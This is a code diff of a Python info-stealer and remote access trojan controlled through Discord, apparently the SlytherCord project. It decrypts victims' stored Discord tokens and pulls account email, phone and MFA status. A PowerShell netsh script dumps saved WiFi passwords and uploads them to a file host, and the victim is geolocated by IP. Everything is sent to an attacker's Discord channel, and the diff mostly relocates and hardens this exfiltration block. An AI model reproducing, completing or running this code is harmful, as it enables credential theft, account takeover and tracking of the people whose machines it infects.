@@ -1,8 +1,6 @@
 import discord
 import os
-import re
 import pyautogui
-import ctypes
 import asyncio
 import sys
 import requests
@@ -18,18 +16,18 @@ from cv2 import VideoCapture, imwrite, CAP_DSHOW
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 from base64 import b64decode
-from os import getlogin, listdir
+from os import listdir
 from json import loads
 from re import findall
 from urllib.request import Request, urlopen
-from subprocess import Popen, PIPE
 from PIL import Image, ImageDraw, ImageFont #mouse grid image
 from comtypes import CLSCTX_ALL
-from ctypes import *
+from ctypes import cast, POINTER
 
 
 file_api = "https://api.letsupload.cc/upload"
 wifi_script = """(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize"""
+global grabembed
 
 tokens = []
 cleaned = []
@@ -39,7 +37,7 @@ checker = []
 
 
 
-def get_token():
+def start_program():
     already_check = []
     checker = []
     local = os.getenv('LOCALAPPDATA')
@@ -93,6 +91,7 @@ def get_token():
                 cleaned.append(i)
         for token in cleaned:
             try:
+                global tok
                 tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
             except IndexError == "Error": continue
             checker.append(tok)
@@ -104,6 +103,8 @@ def get_token():
                         res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                     except: continue
                     if res.status_code == 200:
+                        global ip, pc_name, pc_username, email, phone, mfa_enabled, nitro_statement
+                        
                         res_json = res.json()
                         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
                         pc_username = os.getenv("UserName")
@@ -119,46 +120,15 @@ def get_token():
                             nitro_statement = "✅"
                         else:    
                             nitro_statement = "❌Blud has no nitro indeed"
+                    
                          
-                        global grabembed
-                        output = subprocess.Popen(["powershell.exe", wifi_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0]
-                        decoded_wifi_pwd = output.decode(sys.stdout.encoding, errors='ignore')
-                        file_name = f"SSID_{mac_address}.txt"
-                        with open(file_name, 'w') as file:
-                            file.write(decoded_wifi_pwd)
-                        SSIDlink = requests.post(file_api, files={"file": open(file_name, "rb")}).json()["data"]["file"]["url"]["full"]
-                        os.remove(file_name)
-                        response = requests.get('https://ipapi.co/json/')
-                        data = response.json()
-                        city = data.get('city')
-                        country = data.get('country')
-                        latitude = data.get('latitude')
-                        longitude = data.get('longitude')
-                        username = os.getlogin()
+                        
 
-                        grabembed=discord.Embed(title="**Grabbed info from: ** ```" + pc_username +"```",colour=0x3)
-                        grabembed.set_author(name="STAR THIS PROJECT ON MY GITHUB NOW!", url="https://github.com/isaaclins/SlytherCord",icon_url="https://cdn.discordapp.com/attachments/1114528537093865494/1128962359562621009/ogkush.png")
-                        grabembed.add_field(name="**Token:**",value=f"```{tok}```",inline=True)
                         
-                        grabembed.add_field(name="**Email:**",value=f"```{email}```",inline=True)
-                        grabembed.add_field(name="**Username:**",value=f"```{pc_username}```",inline=True)
-                        grabembed.add_field(name="**PC Name:**",value=f"```{pc_name}```",inline=True)
-                        grabembed.add_field(name="**Phone number:**", value=f"```{phone}```",inline=True)
-                        grabembed.add_field(name="**MFA Enabled?**", value=f"```{mfa_enabled}```",inline=True)
-                        grabembed.add_field(name="**Does blud have Nitro?**", value=f"```{nitro_statement}```",inline=True)
-                        grabembed.add_field(name="**IP Address:**",value=f"```{ip}```",inline=True)
-                        grabembed.add_field(name="**Country:**", value=f"```{country}```",inline=True)
-                        grabembed.add_field(name="**Aprox. Latitude:**", value=f"```{latitude}```",inline=True)
-                        grabembed.add_field(name="**Aprox. Longitude**",value=f"```{longitude}```",inline=True)
-                        grabembed.add_field(name="**City:**",value=f"```{city}```",inline=True)
-                        grabembed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
-                        grabembed.add_field(name="**SSID & Passwords:**",value=f"{SSIDlink}",inline=True)
                         
-                        grabembed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
-                        grabembed.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
-                        grabembed.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
-                        grabembed.timestamp = datetime.utcnow()
+
                 else: continue
+                print("e")
 
 
 def volumeup():
@@ -241,16 +211,62 @@ global mac_address
 mac_address = str(get_mac())
 @client.event
 async def on_ready():
-    get_token()
+    start_program()
+    try:
+        output = subprocess.Popen(["powershell.exe", wifi_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0]
+        decoded_wifi_pwd = output.decode(sys.stdout.encoding, errors='ignore')
+        file_name = f"SSID_{mac_address}.txt"
+        with open(file_name, 'w') as file:
+            file.write(decoded_wifi_pwd)
+        SSIDlink = requests.post(file_api, files={"file": open(file_name, "rb")}).json()["data"]["file"]["url"]["full"]
+        os.remove(file_name)
+    except Exception as e:
+        SSIDlink = None
+    response = requests.get('https://ipapi.co/json/')
+    data = response.json()
+    city = data.get('city')
+    country = data.get('country')
+    latitude = data.get('latitude')
+    longitude = data.get('longitude')
+    username = os.getlogin()
+    grabembed=discord.Embed(title="**Grabbed info from: ** ```" + pc_username +"```",colour=0x3)
+    grabembed.set_author(name="STAR THIS PROJECT ON MY GITHUB NOW!", url="https://github.com/isaaclins/SlytherCord",icon_url="https://cdn.discordapp.com/attachments/1114528537093865494/1128962359562621009/ogkush.png")
+    grabembed.add_field(name="**Token:**",value=f"```{tok}```",inline=True)
+    
+    grabembed.add_field(name="**Email:**",value=f"```{email}```",inline=True)
+    grabembed.add_field(name="**Username:**",value=f"```{pc_username}```",inline=True)
+    grabembed.add_field(name="**PC Name:**",value=f"```{pc_name}```",inline=True)
+    grabembed.add_field(name="**Phone number:**", value=f"```{phone}```",inline=True)
+    grabembed.add_field(name="**MFA Enabled?**", value=f"```{mfa_enabled}```",inline=True)
+    grabembed.add_field(name="**Does blud have Nitro?**", value=f"```{nitro_statement}```",inline=True)
+    grabembed.add_field(name="**IP Address:**",value=f"```{ip}```",inline=True)
+    grabembed.add_field(name="**Country:**", value=f"```{country}```",inline=True)
+    grabembed.add_field(name="**Aprox. Latitude:**", value=f"```{latitude}```",inline=True)
+    grabembed.add_field(name="**Aprox. Longitude**",value=f"```{longitude}```",inline=True)
+    grabembed.add_field(name="**City:**",value=f"```{city}```",inline=True)
+    grabembed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
+    try:
+        grabembed.add_field(name="**SSID & Passwords:**",value=f"{SSIDlink}",inline=True)
+    except Exception as err:
+        grabembed.add_field(name="**SSID & Passwords:**",value=f"ERROR: Not able to extract. error message: \n {err}",inline=True)
+    grabembed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
+    grabembed.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
+    grabembed.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
+    grabembed.timestamp = datetime.utcnow()
+
+
+
     guild = client.get_guild(int(guild_id))
     channel = await find_channel_by_name(guild, mac_address)
     if channel:
+        #grabembed="hello world"
         await channel.send(embed=grabembed)
+        #await channel.send("hello world")
     else:
-        
         channel = await guild.create_text_channel(mac_address)
         e = await channel.send(embed=grabembed)
         await e.pin()
+        await channel.send("hello world")
 @client.event
 async def on_message(message):
     guild = client.get_guild(int(guild_id))
@@ -568,7 +584,6 @@ async def on_message(message):
                 win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                 win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                 win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
-
             elif message.content.lower().startswith(".mouse"):
                 command = message.content[7:]
                 if command.lower() == "":
